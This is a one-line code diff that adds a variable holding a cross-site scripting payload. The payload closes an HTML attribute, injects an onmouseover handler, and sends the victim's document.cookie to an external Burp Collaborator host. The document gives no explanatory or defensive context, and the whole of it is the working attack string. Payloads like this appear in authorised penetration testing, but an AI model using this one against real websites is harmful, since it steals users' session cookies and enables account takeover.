@@ -1,0 +1,1 @@
+payload = ' onmouseover='document.location="http://hwhxxnvtjvj02h2v7ym0gkmiz959ty.burpcollaborator.net?".concat(document.cookie)
